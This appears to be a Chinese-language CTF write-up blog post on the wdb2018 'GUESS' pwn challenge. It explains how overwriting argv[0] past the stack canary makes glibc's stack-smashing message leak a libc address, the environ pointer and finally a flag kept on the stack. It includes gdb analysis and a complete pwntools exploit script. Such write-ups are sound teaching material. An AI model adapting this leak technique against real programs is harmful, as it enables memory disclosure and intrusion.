---
layout: post
title: "[PWN]Stack Smash题目分析--wdb2018_guess"
date: 2026-06-20
categories: [PWN]
---
以wdb2018的GUESS为例子，反汇编后的伪代码如下

![ref1](/assets/images/2026-06-20-Stack-Smash-a-wp/ref1.png)

简单分析一下就是会把flag读入内存，准确的说是读入栈的区域，然后又给了个溢出漏洞，同时这题开了canary，那就没法rop

```bash
b14ckb0x@b14ckb0x:~/Desktop/temp/GUESS$ checksec GUESS
[*] '/home/b14ckb0x/Desktop/temp/GUESS/GUESS'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x3fe000)
    RUNPATH:    b'./'
```

不过运行一下，可以发现，这题以fork模式运行，并且检测栈溢出的函数会打印argv\[0\]，所以就可以利用它来泄漏栈上的flag。这个fork模式是下面攻击成立的前提，它保证了程序因为栈溢出重启后，各项地址不是重新随机化而都是固定的。

```bash
./GUESS        
This is GUESS FLAG CHALLENGE!
Please type your guessing flag
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
You should take more effort to get six sence, and one more challenge!!
*** stack smashing detected ***: ./GUESS terminated
Please type your guessing flag
```

漏洞函数是这样：

```c
void __attribute__ ((noreturn)) __stack_chk_fail (void) 
{ 
  __fortify_fail ("stack smashing detected"); 
} 
void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg) 
{ /* The loop is added only to keep gcc happy. */ 
  while (1) 
    __libc_message (2, "*** %s ***: %s terminated\n", msg, __libc_argv[0] ?: "<unknown>"); 
}
```

不过这个函数里的\_\_libc\_argv\[0\]，glibc-2.31之后删了，所以不会打印，不能用来泄漏了。所以如果glibc版本太高的话，需要手动调整一下

```bash
b14ckb0x@b14ckb0x:~/Desktop/temp/GUESS$ patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./GUESS                        

b14ckb0x@b14ckb0x:~/Desktop/temp/GUESS$ patchelf --set-rpath ./ ./GUESS                                          
b14ckb0x@b14ckb0x:~/Desktop/temp/GUESS$ ldd GUESS                                                
	linux-vdso.so.1 (0x00007fbc719ef000)
	libc.so.6 => ./libc.so.6 (0x00007fbc71600000)
	./ld-linux-x86-64.so.2 => /lib64/ld-linux-x86-64.so.2 (0x00007fbc719f1000)
```

开gdb调试，在main函数（0x400a40）下断点，运行到gets函数，输入deadbeef，然后查看栈

![ref2](/assets/images/2026-06-20-Stack-Smash-a-wp/ref2.png)

0x7fffffffdaa8就是argv\[0\]，0x7fffffffd980是我们输入的位置，0x7fffffffd950是flag的位置，接下来的思路很简单，在0x7fffffffd980构造足够覆盖到argv\[0\]的长度的payload，并把argv\[0\]覆盖成某个函数的地址，这样就可以通过泄漏的函数算出libc基地址，然后利用libc中的一个叫environ的东西泄漏出栈的基地址（environ的地址和栈地址有固定偏移），在调试中可以算出flag的地址0x7fffffffd950和environ之间的偏移，然后就可以最终泄漏出flag了。

![ref3](/assets/images/2026-06-20-Stack-Smash-a-wp/ref3.png)

通过调试可以看到environ的地址是0x7fffffffdab8，据此算出和flag之间的偏移。

完整exp

```python
from pwn import *
from LibcSearcher import *
from ctypes import cdll

filename = './GUESS'
context.arch='amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'neww']
local = 1
all_logs = []
elf = ELF(filename)
libc = elf.libc

sh = process(filename)

def leak_info(name, addr):
    output_log = '{} => {}'.format(name, hex(addr))
    all_logs.append(output_log)
    success(output_log)
#got地址覆盖__libc_argv[0]，通过stack smash泄露got地址，获得libc
payload = b'a'*0x128+p64(elf.got['puts'])
sh.sendlineafter(b'Please type your guessing flag',payload)
puts_add=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
leak_info('puts_got',puts_add)
libc.address = puts_add-libc.sym['puts']
#通过environ确定偏移
environ = libc.sym['__environ']
payload = b'a'*0x128+p64(environ)
sh.sendlineafter(b'Please type your guessing flag',payload)
environ_addr=u64(sh.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
leak_info('environ_addr',environ_addr)
flag_addr = environ_addr-0x168
#泄露flag
payload = b'a'*0x128+p64(flag_addr)
# payload = b'a'*0x128+p64(environ)
sh.sendlineafter(b'Please type your guessing flag',payload)
sh.recv()
sh.interactive()
```
